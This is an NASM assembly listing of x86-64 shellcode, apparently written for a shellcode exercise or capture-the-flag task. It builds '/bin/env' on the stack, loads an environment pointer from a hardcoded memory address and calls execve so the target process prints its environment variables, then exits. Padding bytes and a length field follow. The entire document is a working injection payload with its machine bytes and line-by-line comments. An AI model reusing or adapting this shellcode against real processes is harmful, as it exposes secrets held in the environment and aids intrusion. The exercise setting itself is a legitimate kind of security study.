     1                                            bits 64
     2                                              ; find out where we are
     3                                  start:     ; your code starts here
     4                                  
     5                                    ; Clears the registers `rax`, `rdi`, `rsi`, and `rdx` (sets them to 0)
     6 00000000 4831C0                    xor rax, rax
     7 00000003 4831FF                    xor rdi, rdi
     8 00000006 4831F6                    xor rsi, rsi
     9 00000009 4831D2                    xor rdx, rdx
    10                                  
    11 0000000C 50                        push rax                ; Push NULL terminator onto the stack
    12 0000000D 48BF2F62696E2F656E-       mov rdi, '/bin/env'     ; Loads the address of the string `/bin/env` into `rdi`
    12 00000016 76                 
    13 00000017 57                        push rdi                ; Push `/bin/env` onto the stack
    14                                  
    15 00000018 4889E7                    mov rdi, rsp            ; Sets `rdi` to point to the top of the stack
    16                                  
    17 0000001B 50                        push rax                ; Pushes a NULL pointer the stack
    18 0000001C 57                        push rdi                ; Pushes the address of `/bin/env` onto the stack
    19                                  
    20 0000001D 4889E6                    mov rsi, rsp            ; Sets `rsi` to point to the top of the stack
    21                                    
    22 00000020 4831D2                    xor rdx, rdx            ; Clears `rdx`
    23                                  
    24 00000023 66BAFF7F                  mov dx, 0x7fff          ; Sets `rdx` to 0x7fff
    25                                  
    26 00000027 48C1E220                  shl rdx, 32             ; Shifts `rdx` left by 32 bits
    27                                  
    28 0000002B B9FFE6FBF7                mov ecx, 0xf7fbe6ff     ; load 0xf7fbe6ff into the low 32 bits of the c register
    29                                  
    30                                    ; Clears the low 8 bits of `rcx`
    31 00000030 48C1E908                  shr rcx, 8              ; Shifts `rcx` right by 8 bits
    32 00000034 48C1E108                  shl rcx, 8              ; Shifts `rcx` left by 8 bits
    33                                  
    34 00000038 4809CA                    or rdx, rcx         
    35                                  
    36 0000003B 488B12                    mov rdx, [rdx]          ; Sets `rdx` to the value at the address stored in `rdx`
    37                                  
    38 0000003E 4831C0                    xor rax, rax            ; Clears `rax`
    39 00000041 B03B                      mov al, 0x3b            ; syscall number for execve
    40                                  
    41 00000043 0F05                      syscall                 ; Calls the syscall
    42                                  
    43 00000045 4889C7                    mov rdi, rax            ; Sets `rdi` to the return value of the syscall
    44 00000048 4831C0                    xor rax, rax            ; Clears `rax`
    45 0000004B B03C                      mov al, 0x3c            ; syscall number for exit
    46 0000004D 0F05                      syscall                 ; Calls the syscall
    47                                  
    48                                    ; Padding so that the stack doesn't iverflow the code
    49 0000004F FFFFFFFFFFFFFFFF          dq 0xffffffffffffffff   
    50 00000057 FFFFFFFFFFFFFFFF          dq 0xffffffffffffffff
    51 0000005F FFFFFFFFFFFFFFFF          dq 0xffffffffffffffff
    52 00000067 FFFFFFFFFFFFFFFF          dq 0xffffffffffffffff
    53                                  
    54                                  
    55                                  end:
    56 0000006F 6F000000                  dd end-start
